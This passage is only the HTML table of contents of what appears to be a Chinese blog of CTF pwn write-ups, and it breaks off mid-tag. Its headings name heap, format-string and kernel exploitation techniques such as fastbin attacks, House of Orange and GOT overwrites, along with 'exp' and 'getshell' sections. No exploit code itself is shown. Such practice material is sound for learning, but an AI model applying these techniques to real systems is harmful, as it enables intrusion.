toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.0.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%AE%BE%E7%BD%AE%E5%A4%A7%E7%9A%84%E5%80%BC%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-number">3.0.4.</span> <span class="toc-text">字符串漏洞设置大的值注意的地方</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">3.0.5.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#One-Gadget"><span class="toc-number">4.</span> <span class="toc-text">One Gadget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HackNote"><span class="toc-number">5.</span> <span class="toc-text">HackNote</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90"><span class="toc-number">5.1.</span> <span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6"><span class="toc-number">5.2.</span> <span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-1"><span class="toc-number">5.3.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0"><span class="toc-number">5.4.</span> <span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-1"><span class="toc-number">5.5.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">5.6.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">5.7.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">5.8.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96libc%E5%9F%BA%E5%9D%80"><span class="toc-number">5.8.1.</span> <span class="toc-text">获取libc基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell-1"><span class="toc-number">5.8.2.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-2"><span class="toc-number">5.9.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easyfmt"><span class="toc-number">6.</span> <span class="toc-text">Easyfmt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-1"><span class="toc-number">6.1.</span> <span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-2"><span class="toc-number">6.2.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">6.3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-3"><span class="toc-number">6.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SuperMaket"><span class="toc-number">7.</span> <span class="toc-text">SuperMaket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">7.0.1.</span> <span class="toc-text">漏洞点:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-number">7.0.2.</span> <span class="toc-text">漏洞代码:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-number">7.0.3.</span> <span class="toc-text">整体思路:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97libc%E7%9A%84%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">7.0.3.1.</span> <span class="toc-text">获得libc的基地址:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8system"><span class="toc-number">7.0.3.2.</span> <span class="toc-text">调用system.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-4"><span class="toc-number">7.0.3.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Babyheap"><span class="toc-number">8.</span> <span class="toc-text">Babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-2"><span class="toc-number">8.1.</span> <span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-1"><span class="toc-number">8.2.</span> <span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-2"><span class="toc-number">8.3.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">8.4.</span> <span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-3"><span class="toc-number">8.5.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="toc-number">8.6.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-3"><span class="toc-number">8.7.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">8.8.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">8.8.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%A0%86%E5%BF%AB%E5%B8%83%E5%B1%80"><span class="toc-number">8.8.2.</span> <span class="toc-text">构造堆快布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8house-of-einherjar-%E6%9D%A5%E5%90%88%E5%B9%B6-chunk-1"><span class="toc-number">8.8.3.</span> <span class="toc-text">使用house of einherjar 来合并 chunk 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E6%BC%8F-main-arena-%E5%92%8Clibc%E5%9F%BA%E5%9D%80"><span class="toc-number">8.8.4.</span> <span class="toc-text">泄漏 main_arena 和libc基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-attack%E6%89%93%E5%85%A5-malloc-hook%E5%A4%84"><span class="toc-number">8.8.5.</span> <span class="toc-text">fastbin attack打入 malloc_hook处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9malloc-hook"><span class="toc-number">8.8.6.</span> <span class="toc-text">修改malloc_hook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#realloc-hook%E5%8F%8D%E6%B1%87%E7%BC%96"><span class="toc-number">8.8.6.1.</span> <span class="toc-text">realloc_hook反汇编</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#execve%E6%89%A7%E8%A1%8C%E6%83%85%E5%86%B5%E5%A6%82%E4%B8%8B"><span class="toc-number">8.8.6.2.</span> <span class="toc-text">execve执行情况如下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E6%9E%84%E9%80%A0%E5%A6%82%E4%B8%8B"><span class="toc-number">8.8.6.3.</span> <span class="toc-text">payload构造如下</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">8.9.</span> <span class="toc-text">get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-5"><span class="toc-number">8.10.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Grey"><span class="toc-number">9.</span> <span class="toc-text">House Of Grey</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-3"><span class="toc-number">9.1.</span> <span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-2"><span class="toc-number">9.2.</span> <span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-3"><span class="toc-number">9.3.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">9.4.</span> <span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-4"><span class="toc-number">9.5.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="toc-number">9.6.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-4"><span class="toc-number">9.7.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-number">9.8.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%BA%E5%9D%80"><span class="toc-number">9.8.1.</span> <span class="toc-text">获取基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%86%85%E5%AD%98%E5%AE%9A%E4%BD%8Dread-ret%E5%9C%B0%E5%9D%80"><span class="toc-number">9.8.2.</span> <span class="toc-text">搜索内存定位read ret地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0rop%E9%93%BE-1"><span class="toc-number">9.8.3.</span> <span class="toc-text">构造rop链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-6"><span class="toc-number">9.9.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Orange"><span class="toc-number">10.</span> <span class="toc-text">House Of Orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-4"><span class="toc-number">10.1.</span> <span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">10.2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-3"><span class="toc-number">10.3.</span> <span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-4"><span class="toc-number">10.4.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">10.5.</span> <span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-5"><span class="toc-number">10.6.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="toc-number">10.7.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-5"><span class="toc-number">10.8.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-5"><span class="toc-number">10.9.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87-1"><span class="toc-number">10.9.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9top-chunk-size%E5%AE%9E%E7%8E%B0free%E7%9A%84%E6%95%88%E6%9E%9C"><span class="toc-number">10.9.2.</span> <span class="toc-text">修改top chunk size实现free的效果</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">10.9.2.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Leak-libc-and-heap-addr"><span class="toc-number">10.9.3.</span> <span class="toc-text">Leak libc and heap addr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E5%BC%82%E5%B8%B8%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B"><span class="toc-number">10.9.4.</span> <span class="toc-text">触发异常劫持控制流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack-%E4%BF%AE%E6%94%B9-IO-list-all"><span class="toc-number">10.9.5.</span> <span class="toc-text">unsorted bin attack 修改 _IO_list_all</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%B5%81%E7%A8%8B"><span class="toc-number">10.9.6.</span> <span class="toc-text">劫持流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9main-arena-fake-file%E4%B8%AD%E7%9A%84chain-%E6%8C%87%E5%90%91%E6%88%91%E4%BB%AC%E5%8D%B3%E5%B0%86%E4%BC%AA%E9%80%A0%E7%9A%84IO-FILE"><span class="toc-number">10.9.7.</span> <span class="toc-text">修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0IO-FILE"><span class="toc-number">10.9.8.</span> <span class="toc-text">伪造IO_FILE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-vtable"><span class="toc-number">10.9.9.</span> <span class="toc-text">伪造 vtable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell-2"><span class="toc-number">10.9.10.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-7"><span class="toc-number">10.10.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UAF"><span class="toc-number">11.</span> <span class="toc-text">UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-5"><span class="toc-number">11.1.</span> <span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-4"><span class="toc-number">11.2.</span> <span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-5"><span class="toc-number">11.3.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">11.4.</span> <span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-6"><span class="toc-number">11.5.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="toc-number">11.6.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-6"><span class="toc-number">11.7.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-6"><span class="toc-number">11.8.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87-2"><span class="toc-number">11.8.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%B8%83%E5%B1%80"><span class="toc-number">11.8.2.</span> <span class="toc-text">堆布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%85%A5chunk-2%E4%BF%AE%E6%94%B9size-%E5%92%8Cfd"><span class="toc-number">11.8.3.</span> <span class="toc-text">打入chunk 2修改size 和fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%85%A5-IO-2-1-stderr-157%E5%A4%84"><span class="toc-number">11.8.4.</span> <span class="toc-text">打入_IO_2_1_stderr + 157处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E6%BC%8Flibc"><span class="toc-number">11.8.5.</span> <span class="toc-text">泄漏libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%85%A5-malloc-hook-0x23%E5%A4%84"><span class="toc-number">11.8.6.</span> <span class="toc-text">打入__malloc_hook - 0x23处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9malloc-hook-%E5%92%8Crealloc-hook%E6%89%93one-gadget"><span class="toc-number">11.8.7.</span> <span class="toc-text">修改malloc_hook 和realloc_hook打one_gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell-1"><span class="toc-number">11.8.8.</span> <span class="toc-text">get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-8"><span class="toc-number">11.9.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyTHeap"><span class="toc-number">12.</span> <span class="toc-text">easyTHeap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-6"><span class="toc-number">12.1.</span> <span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-5"><span class="toc-number">12.2.</span> <span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-6"><span class="toc-number">12.3.</span> <span class="toc-text">保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-5"><span class="toc-number">12.4.</span> <span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-7"><span class="toc-number">12.5.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B3%951"><span class="toc-number">12.6.</span> <span class="toc-text">打法1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-5"><span class="toc-number">12.6.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-7"><span class="toc-number">12.6.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-7"><span class="toc-number">12.6.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87-3"><span class="toc-number">12.6.3.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-heap"><span class="toc-number">12.6.3.2.</span> <span class="toc-text">leak heap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leak-libc"><span class="toc-number">12.6.3.3.</span> <span class="toc-text">leak libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%85%A5"><span class="toc-number">12.6.3.4.</span> <span class="toc-text">实现任意地址写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9IO-2-1-stdout%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">12.6.3.5.</span> <span class="toc-text">修改IO_2_1_stdout结构体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">12.6.4.</span> <span class="toc-text">exp-1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B3%952"><span class="toc-number">12.7.</span> <span class="toc-text">打法2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-6"><span class="toc-number">12.7.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-8"><span class="toc-number">12.7.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-8"><span class="toc-number">12.7.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">12.7.4.</span> <span class="toc-text">exp-2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B3%953"><span class="toc-number">12.8.</span> <span class="toc-text">打法3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-7"><span class="toc-number">12.8.1.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-9"><span class="toc-number">12.8.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">12.8.3.</span> <span class="toc-text">exp-3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AXB-2019-fmt"><span class="toc-number">13.</span> <span class="toc-text">AXB_2019_fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E6%BA%90-7"><span class="toc-number">13.1.</span> <span class="toc-text">来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%BE%E5%BA%A6-6"><span class="toc-number">13.2.</span> <span class="toc-text">难度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0-6"><span class="toc-number">13.3.</span> <span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vul-8"><span class="toc-number">13.4.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-8"><span class="toc-number">13.5.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-10"><span class="toc-number">13.6.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-9"><span class="toc-number">13.7.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB"><span class="toc-number">13.7.1.</span> <span class="toc-text">计算偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99dump%E8%84%9A%E6%9C%AC"><span class="toc-number">13.7.2.</span> <span class="toc-text">编写dump脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dump-%E6%96%87%E4%BB%B6%E8%84%9A%E6%9C%AC"><span class="toc-number">13.7.2.0.1.</span> <span class="toc-text">dump 文件脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90dump%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">13.7.3.</span> <span class="toc-text">IDA分析dump的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-libc-1"><span class="toc-number">13.7.4.</span> <span class="toc-text">leak libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9strlen%E7%9A%84got%E8%A1%A8%E5%86%85%E5%AE%B9%E4%B8%BAsystem"><span class="toc-number">13.7.4.1.</span> <span class="toc-text">修改strlen的got表内容为system</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell-2"><span class="toc-number">13.7.5.</span> <span class="toc-text">get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-9"><span class="toc-number">13.8.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kenel-pwn-ciscn-2017-baby-driver"><span class="toc-number">14.</span> <span class="toc-text">Kenel pwn ciscn 2017 baby driver</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E9%A2%84%E5%A4%87"><span class="toc-number">14.1.</span> <span class="toc-text">知识预备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90"><span class="toc-number">14.1.1.</span> <span class="toc-text">权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SLAB-amp-SLUB"><span class="toc-number">14.1.2.</span> <span class="toc-text">SLAB &amp; SLUB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">14.2.</span> <span class="toc-text">设备程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyopen%E5%87%BD%E6%95%B0"><span class="toc-number">14.2.1.</span> <span class="toc-text">babyopen函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babywrite%E5%87%BD%E6%95%B0"><span class="toc-number">14.2.2.</span> <span class="toc-text">babywrite函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyread-%E5%87%BD%E6%95%B0"><span class="toc-number">14.2.3.</span> <span class="toc-text">babyread 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyioctrl%E5%87%BD%E6%95%B0"><span class="toc-number">14.2.4.</span> <span class="toc-text">babyioctrl函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyrelease%E5%87%BD%E6%95%B0"><span class="toc-number">14.2.5.</span> <span class="toc-text">babyrelease函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-11"><span class="toc-number">14.3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-10"><span class="toc-number">14.4.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">14.5.</span> <span class="toc-text">调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96vmlinux"><span class="toc-number">14.5.1.</span> <span class="toc-text">提取vmlinux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8gdb"><span class="toc-number">14.5.2.</span> <span class="toc-text">启动gdb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8boot-sh%E8%8E%B7%E5%8F%96babydriver%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%9F%BA%E5%9D%80"><span class="toc-number">14.5.3.</span> <span class="toc-text">启动boot.sh获取babydriver的加载基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E7%AC%A6%E5%8F%B7%E8%A1%A8"><span class="toc-number">14.5.4.</span> <span class="toc-text">导入符号表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95qumu"><span class="toc-number">14.5.5.</span> <span class="toc-text">调试qumu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-1"><span class="toc-number">14.5.6.</span> <span class="toc-text">调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%AA%E6%B9%96%E6%9D%AF-2020"><span class="toc-number">15.</span> <span class="toc-text">太湖杯 2020</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-11"><span class="toc-number">15.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2018-core"><span class="toc-number">16.</span> <span class="toc-text">强网杯 2018 core</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 